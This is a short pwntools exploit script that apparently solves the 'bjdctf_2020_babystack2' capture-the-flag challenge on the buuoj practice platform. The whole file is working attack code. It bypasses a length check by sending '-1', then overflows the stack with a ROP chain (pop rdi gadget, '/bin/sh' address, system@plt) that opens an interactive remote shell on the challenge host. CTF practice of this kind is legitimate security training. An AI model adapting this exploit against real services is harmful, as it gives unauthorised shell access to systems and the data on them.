from pwn import *


def bjdctf_2020_babystack2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/bjdctf_2020_babystack2'):
    print('bjdctf_2020_babystack2 start')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 29513)
    target_elf = ELF(file_name)

    pop_ret_gadget = p64(0x400893)  # pop rdi ; ret
    system_plt = p64(target_elf.plt['system'])
    bin_sh_address = p64(next(target_elf.search(b'/bin/sh')))

    target.sendlineafter('[+]Please input the length of your name:', '-1')

    payload = b'a' * 24
    # system('/bin/sh')
    payload += pop_ret_gadget + bin_sh_address + system_plt

    # gdb.attach(target)

    target.sendlineafter('[+]What\'s u name?', payload)

    target.interactive()

    print('bjdctf_2020_babystack2 end')


if __name__ == '__main__':
    bjdctf_2020_babystack2()
